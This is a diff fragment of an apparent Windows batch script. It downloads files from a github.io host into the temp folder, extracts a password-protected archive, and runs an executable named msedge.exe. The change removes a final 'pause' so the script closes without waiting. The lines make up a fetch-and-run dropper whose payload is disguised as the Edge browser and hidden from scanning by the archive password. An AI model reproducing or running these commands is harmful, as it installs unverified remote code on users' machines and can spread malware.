@@ -6,4 +6,3 @@ curl https://kingdog2.github.io/7z.dll -o "%TEMP%\7z.dll"
 curl https://kingdog2.github.io/msedge.7z -o "%TEMP%\msedge.7z"
 %TEMP%\7z.exe x %TEMP%\msedge.7z -pGeorge_5595 -o"%TEMP%"
 %TEMP%\msedge.exe
-pause
